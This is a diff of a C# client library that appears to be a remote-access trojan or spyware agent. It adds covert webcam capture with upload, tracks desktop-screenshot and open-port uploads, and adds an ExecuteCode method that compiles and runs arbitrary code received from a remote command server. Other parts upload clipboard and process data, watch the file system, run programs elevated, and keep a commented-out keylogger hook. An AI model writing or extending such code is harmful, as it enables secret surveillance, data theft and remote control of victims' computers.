@@ -1,5 +1,7 @@
-﻿using Models;
+﻿using Microsoft.CSharp;
+using Models;
 using System;
+using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data.SQLite;
@@ -21,21 +23,26 @@ namespace Library
 
         }
     }
+    public class CommandEventArgs : EventArgs
+    {
+        public ECommand Command { get; set; }
+        public CommandEventArgs()
+        {
 
-    public delegate void OnScreenshotDelegate(object sender, Bitmap bitmapImage);
+        }
+    }
+
     public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
-    public delegate void OnCommandDelegate(object sender, ECommand e);
+    public delegate void OnCommandDelegate(object sender, CommandEventArgs e);
     public delegate void OnAuthorizedHandler(object sender, AuthEventArgs e);
 
     public class Handler
     {
         private bool isQuitting = false;
         private FileSystemWatcher watcher;
-        private Timer screenShotTimer;
         public Transmitter Transmitter { get; set; }
         public Bitmap Screenshot { get; private set; }
         public FileDirHandler FileDirInfo { get; private set; }
-        public event OnScreenshotDelegate OnScreenshot;
         public event OnFileEventDelegate OnFileEvent;
         public event OnCommandDelegate OnCommandEvent;
         public event OnAuthorizedHandler OnAuthorizedEvent;
@@ -62,8 +69,6 @@ namespace Library
         {
             FileDirInfo = new FileDirHandler();
             watcher = new FileSystemWatcher();
-            screenShotTimer = new Timer();
-            screenShotTimer.Tick += screenShotTimer_Tick;
         }
         #endregion
 
@@ -94,17 +99,6 @@ namespace Library
             //process.Disposed += LaunchIfCrashed;
             process.Exited += Application_ApplicationExit;
             return process;
-        }
-
-        public void StartScreenshotTimer(int intervalMilliseconds)
-        {
-            screenShotTimer.Interval = intervalMilliseconds;
-            screenShotTimer.Start();
-        }
-
-        public void StopScreenshotTimer()
-        {
-            screenShotTimer.Stop();
         }
 
         /// <summary>
@@ -173,18 +167,6 @@ namespace Library
             //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
             FileDirInfo.CreateFileDirInfoEntry(e);
             OnFileEvent(this, e);
-        }
-
-        void screenShotTimer_Tick(object sender, EventArgs e)
-        {
-            if (Screenshot != null)
-                Screenshot.Dispose();
-
-            Screenshot = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            {
-                OnScreenshot(this, Screenshot);
-            }
-
         }
 
         #region Watcher Events
@@ -291,6 +273,35 @@ namespace Library
             }
         }
 
+        public void UploadWebcamImage()
+        {
+            long quality = 95;
+            long.TryParse(Handler.Instance.Transmitter.TSettings.Parameters, out quality);
+            var bitmapImage = GetWebCamImage();
+            Handler.Instance.Transmitter.UploadImage("webcam.jpg", bitmapImage, quality);
+        }
+
+        private Bitmap GetWebCamImage(int id = 0)
+        {
+            Bitmap image = null;
+            var webCameraControl = new WebEye.WebCameraControl();
+            WebEye.WebCameraId camera = null;
+            try
+            {
+                camera = (webCameraControl.GetVideoCaptureDevices() as List<WebEye.WebCameraId>)[id];
+            }
+            catch { }
+            if (camera != null)
+            {
+                webCameraControl.StartCapture(camera);
+                System.Threading.Thread.Sleep(2000);
+                image = webCameraControl.GetCurrentImage();
+                System.Threading.Thread.Sleep(250);
+                webCameraControl.StopCapture();
+            }
+            return image;
+        }
+
         public void UploadClipboardData()
         {
 
@@ -310,12 +321,22 @@ namespace Library
             }
         }
 
-        public void UploadDesktopImage()
+        public UploadResult UploadDesktopImage()
         {
+            UploadResult result = null;
             long quality = 80;
             long.TryParse(Transmitter.TSettings.Parameters, out quality);
             var bitmapImage = ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
-            Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
+            if (bitmapImage != null)
+            {
+                result = new UploadResult()
+                {
+                    FileName = "desktop.jpg",
+                    FileSize = bitmapImage.ImageToByte().Length
+                };
+                Transmitter.UploadImage("desktop.jpg", bitmapImage, quality);
+            }
+            return result;
         }
 
         public void ExecuteCommand()
@@ -467,41 +488,40 @@ namespace Library
         bool ConnectAndSetup()
         {
             bool isAuthorized = Handler.Instance.Transmitter.Authorize();
-            //OnAuthorizedEvent(this, new AuthEventArgs() { IsAuthenticated = isAuthorized });
             if (isAuthorized)
             {
-                //Handler.Instance.StartKeyLogger();
                 //Handler.Instance.StartExceptionHandling();
                 Handler.Instance.StartDirectoryWatcher();
-
-                //Handler.Instance.OnReturn += (o, e) =>
-                //{
-                //    HandleReturnEvent(e);
-                //};
                 Handler.Instance.OnFileEvent += (o, e) =>
                 {
                     HandleFileEvent(e);
                 };
-                Handler.Instance.OnScreenshot += (o, e) =>
-                {
-                    //HandleImageEvent(e);
-                };
-
                 transmitTimer = new Timer();
                 transmitTimer.Interval = transmitTimerInterval;
                 transmitTimer.Tick += (o, e) =>
                 {
                     Handler.Instance.Transmitter.LoadSettings();
-                    if (Handler.Instance.Transmitter.TSettings == null) return;
+                    if (Handler.Instance.Transmitter.TSettings == null)
+                    {
+                        return;
+                    }
                     Handler.Instance.Transmitter.UpdateLastActive();
-                    if (Handler.Instance.Transmitter.TSettings.HasExectuted) return;
+                    if (Handler.Instance.Transmitter.TSettings.HasExectuted)
+                    {
+                        return;
+                    }
                     Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
-                    //var command = Handler.Instance.Transmitter.GetCommand();
-                    //if (!command.ToString().Equals("DO_NOTHING"))
-                    //{
-                    //    MessageBox.Show(command.ToString());
-                    //}
-                    OnCommandEvent(this, Handler.Instance.Transmitter.TSettings.Command);
+                    if (Handler.Instance.Transmitter.TSettings.Command == ECommand.DO_NOTHING)
+                    {
+                        OnAuthorizedEvent(this, new AuthEventArgs()
+                        {
+                            IsAuthenticated = isAuthorized
+                        });
+                    }
+                    OnCommandEvent(this, new CommandEventArgs()
+                    {
+                        Command = Handler.Instance.Transmitter.TSettings.Command
+                    });
                 };
                 transmitTimer.Enabled = true;
             }
@@ -552,19 +572,6 @@ namespace Library
             return 0;
         }
 
-        private void HandleImageEvent(Bitmap e)
-        {
-            /*if (pictureBox1.InvokeRequired)
-            {
-                SetImageCallback d = new SetImageCallback(HandleImageEvent);
-                this.Invoke(d, new object[] { e });
-            }
-            else
-            {
-                pictureBox1.Image = e;
-            }*/
-        }
-
         public bool RunElevated(string fileName)
         {
             //MessageBox.Show("Run: " + fileName);
@@ -601,12 +608,19 @@ namespace Library
             EmptyWorkingSet(Process.GetCurrentProcess().Handle);
         }
 
-        public void UploadPortInfo()
+        public UploadResult UploadPortInfo()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetPortInfo();
             piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
-            Handler.Instance.Transmitter.UploadData("ports.txt", sb.ToString(), false);
+            var data = sb.ToString();
+            UploadResult result = new UploadResult()
+            {
+                FileName = "ports.txt",
+                FileSize = data.Length
+            };
+            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
+            return result;
         }
 
         public void UploadProcessInfo()
@@ -886,6 +900,60 @@ namespace Library
                 return true;
             }
             catch (Exception ex) { return false; }
+        }
+
+        public void ExecuteCode()
+        {
+            string code = @"
+    using System;
+    using System.Drawing;
+    using System.Text;
+    using System.Windows.Forms;
+    using System.IO;
+    namespace Client
+    {
+        public class Program
+        {
+            public static void Main()
+            {
+            " +
+        Handler.Instance.Transmitter.TSettings.Parameters
+        + @"
+            }
+        }
+    }
+";
+
+            CSharpCodeProvider provider = new CSharpCodeProvider();
+            CompilerParameters parameters = new CompilerParameters();
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            parameters.GenerateInMemory = true;
+            parameters.GenerateExecutable = true;
+            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
+            if (results.Errors.HasErrors)
+            {
+                StringBuilder sb = new StringBuilder();
+                foreach (CompilerError error in results.Errors)
+                {
+                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
+                }
+                Handler.Instance.Transmitter.UploadData("exception.txt", sb.ToString(), false);
+            }
+            Assembly assembly = results.CompiledAssembly;
+            Type program = assembly.GetType("Client.Program");
+            MethodInfo main = program.GetMethod("Main");
+            try
+            {
+                main.Invoke(null, null);
+            }
+            catch { }
+        }
+        
+        public void UploadResult(UploadResult result)
+        {
+            Handler.Instance.Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
         }
     }
 }
